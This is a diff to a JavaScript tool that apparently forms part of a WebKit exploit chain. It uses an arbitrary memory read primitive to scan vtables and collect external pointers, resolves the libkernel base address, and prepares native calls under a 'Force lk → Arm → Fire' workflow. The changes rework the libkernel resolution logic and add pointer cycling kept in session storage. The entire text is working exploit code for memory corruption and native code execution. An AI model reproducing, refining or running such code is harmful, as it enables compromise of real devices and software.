@@ -47,17 +47,15 @@ import {
     verifyLibkernelBase,
     extPtrToLkCandidates,
     plausibleHeapCell,
-    resolveExtPtrSafe,
-    resolveExtListVote,
+    resolveExtAlignedKError,
     resolveMinExtDeepWalk,
     tryWebkitNearLibkernel,
-    resolveExtAlignedKError,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831q";
+const BUILD_ID = "rw-20250831r";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -2002,20 +2000,29 @@ function runVerifyLk() {
     const p = window.p;
     const off = loadEffectiveOff();
     const { webkitBase } = basesFromSession(off);
-    const ptr = lkFromUi();
+    let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
+    if (!hex) {
+        hex = loadExtPtrAt(0) || "";
+        if (hex && addrIn) addrIn.value = hex;
+    }
+    if (!hex) {
+        mark("LK-SKIP", "hex empty — Scan GOT lite first");
+        return;
+    }
+    const ptr = parseAddr(hex);
     if (!ptr) {
-        mark("LK-SKIP", "hex box empty — Scan GOT lite or Load cal ptr first");
+        mark("LK-SKIP", "bad hex");
         return;
     }
     let v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
     let resolved = null;
     if (!v.ok) {
-        resolved = resolveExtPtrSafe(p, ptr, off, webkitBase);
+        resolved = tryResolveExtVerifyOne(p, off, webkitBase, hex, { minWalkPages: 32 });
         if (resolved) {
             saveLibkernelSession(resolved.lk, resolved.iatRva);
             if (addrIn) addrIn.value = String(resolved.lk);
             v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
-            mark("LK-RESOLVE-OK", String(ptr) + " → " + resolved.lk + " via " + resolved.via);
+            mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via);
         }
     }
     const lkBase = resolved ? resolved.lk : ptr;
@@ -2029,70 +2036,59 @@ function runVerifyLk() {
         state("weak lk — Force lk → Arm → Fire", "warn");
     } else {
         mark("LK-VERIFY-BAD", v.error || "bad");
-        state("verify failed — try next LK-EXT ptr", "bad");
+        cycleExtPtrInHex();
+        state("verify fail — hex advanced to next ext ptr", "bad");
     }
     renderOut();
-    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + ptr, "LK-VERIFY");
+    crashLog.append("VERIFY " + (v.ok ? "OK" : "FAIL") + " " + hex, "LK-VERIFY");
     crashLog.flushSync();
 }
 
-function tryResolveExtList(p, off, webkitBase, ext, opts) {
-    opts = opts || {};
-    if (!p || !ext || !ext.length) return null;
-    const hexes = [];
-    for (let i = 0; i < ext.length; i++) {
-        const h = extPtrHex(ext[i]);
-        if (h) hexes.push(h);
-    }
-    if (!hexes.length) return null;
+function tryResolveExtFinishLite(p, off, webkitBase) {
+    if (!p || !webkitBase) return null;
+    return tryWebkitNearLibkernel(p, webkitBase, off);
+}
 
+function tryResolveExtVerifyOne(p, off, webkitBase, hex, opts) {
+    opts = opts || {};
+    if (!p || !hex) return null;
+    const fn = parseAddr(hex);
+    if (!fn) return null;
     if (webkitBase) {
         const near = tryWebkitNearLibkernel(p, webkitBase, off);
-        if (near) return { hit: near, from: "wk-near", idx: -1 };
+        if (near) return near;
     }
-
-    const deep = resolveMinExtDeepWalk(p, hexes, off, webkitBase, opts.minWalkPages || 128);
-    if (deep && deep.lk) return { hit: deep, from: deep.from || "min", idx: -1 };
-    if (deep && deep.miss) {
-        mark("LK-MIN-WALK", "from=" + (deep.from || "?").slice(-9)
-            + " pages=" + (deep.pages || 0)
-            + (deep.magSeen && deep.magSeen.length ? " mag=" + deep.magSeen.join(",") : " mag=none"));
-    }
-
-    if (hexes.length >= 2) {
-        const voteOpts = Object.assign({ walkPages: opts.walkPages || 64 }, opts);
-        const voted = resolveExtListVote(p, hexes, off, webkitBase, voteOpts);
-        if (voted) {
-            return {
-                hit: voted,
-                from: "vote/" + (voted.vote != null ? voted.vote : "?"),
-                idx: -1,
-                voteRank: voteOpts._voteRank || null,
-            };
-        }
-        if (voteOpts._voteRank && voteOpts._voteRank.length) {
-            mark("LK-VOTE", voteOpts._voteRank.map(function (r) {
-                return r.key.slice(-9) + "x" + r.count;
-            }).join(" "));
-        } else {
-            mark("LK-VOTE-EMPTY", voteOpts._voteDiag || "no SCE/ELF hdr");
-        }
-    }
-
-    for (let i = 0; i < hexes.length; i++) {
-        const fn = parseAddr(hexes[i]);
-        if (!fn) continue;
-        const ak = resolveExtAlignedKError(p, fn, off, webkitBase);
-        if (ak) return { hit: ak, from: hexes[i], idx: i };
-    }
-
-    for (let i = 0; i < ext.length; i++) {
-        const fn = parseAddr(extPtrHex(ext[i]));
-        if (!fn) continue;
-        const hit = resolveExtPtrSafe(p, fn, off, webkitBase, opts);
-        if (hit) return { hit, from: extPtrHex(ext[i]), idx: i };
+    const ak = resolveExtAlignedKError(p, fn, off, webkitBase);
+    if (ak) return ak;
+    if (!opts.noWalk) {
+        const deep = resolveMinExtDeepWalk(p, [hex], off, webkitBase, opts.minWalkPages || 32);
+        if (deep && deep.lk) return deep;
     }
     return null;
+}
+
+let extResolveIdx = 0;
+
+function loadExtPtrAt(idx) {
+    try {
+        const raw = sessionStorage.getItem(SS_CAL_EXT_PTRS);
+        if (!raw) return null;
+        const arr = JSON.parse(raw);
+        if (!Array.isArray(arr) || !arr.length) return null;
+        extResolveIdx = ((idx % arr.length) + arr.length) % arr.length;
+        return arr[extResolveIdx].ptr.replace(/^0x/i, "");
+    } catch (_) {
+        return null;
+    }
+}
+
+function cycleExtPtrInHex() {
+    const n = loadExtPtrAt(extResolveIdx + 1);
+    if (n && addrIn) {
+        addrIn.value = n;
+        mark("LK-EXT-NEXT", (extResolveIdx + 1) + " → " + n);
+    }
+    return n;
 }
 
 function extPtrHex(entry) {
@@ -2168,41 +2164,38 @@ function finishFindLkChunk(chunk) {
                 const h = extPtrHex(ext[ei]);
                 if (h) hexes.push(h);
             }
-            mark("LK-EXT", "n=" + ext.length + (hexes.length ? " " + hexes.join(" ") : ""));
             saveExtPtrsSession(ext);
+            extResolveIdx = 0;
+            mark("LK-EXT", "n=" + ext.length + " saved");
+            if (hexes[0]) mark("LK-EXT0", hexes[0]);
+            if (hexes[1]) mark("LK-EXT1", hexes[1]);
+            renderOut();
+            crashLog.flushSync();
 
             const p = window.p;
             const off = loadEffectiveOff();
             const { webkitBase } = basesFromSession(off);
-            const resolved = tryResolveExtList(p, off, webkitBase, ext, {
-                walkPages: findLkPreset ? findLkPreset.walkPages : 64,
-                minWalkPages: findLkPreset ? findLkPreset.minWalkPages : 128,
-            });
-            if (resolved) {
-                saveLibkernelSession(resolved.hit.lk, resolved.hit.iatRva);
-                if (addrIn) addrIn.value = String(resolved.hit.lk);
-                mark("LK-RESOLVE-OK", resolved.from + " → " + resolved.hit.lk
-                    + " via " + resolved.hit.via
-                    + (resolved.hit.k__error != null
-                        ? " (k__error=0x" + resolved.hit.k__error.toString(16) + ")" : "")
-                    + " build=" + BUILD_ID);
+            const near = tryResolveExtFinishLite(p, off, webkitBase);
+            if (near) {
+                saveLibkernelSession(near.lk, near.iatRva);
+                if (addrIn) addrIn.value = String(near.lk);
+                mark("LK-RESOLVE-OK", "wk-near → " + near.lk + " via " + near.via + " build=" + BUILD_ID);
                 state("lk resolved — Force lk → Arm → Fire", "ok");
                 renderOut();
                 crashLog.flushSync();
                 return true;
             }
-            mark("LK-RESOLVE-MISS", "no lk from ext/wk-near/min-walk — paste hex → Verify lk");
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "hex=ext ptr — Verify lk or Force lk");
+            mark("LK-HINT", "Verify lk cycles ext ptrs (1 read path) — or Force lk");
+            mark("LK-MISS", "ext collected — no auto walk (OOM-safe) build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
         } else if ((chunk.vtCount || 0) === 0) {
             mark("LK-HINT", "no vtable — check LK-CELL-DBG");
         } else {
             mark("LK-HINT", "no ext ptrs in vtable slots");
+            mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
         }
-
-        mark("LK-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
     } catch (err) {
         mark("LK-FINISH-ERR", err.message || String(err));
     }
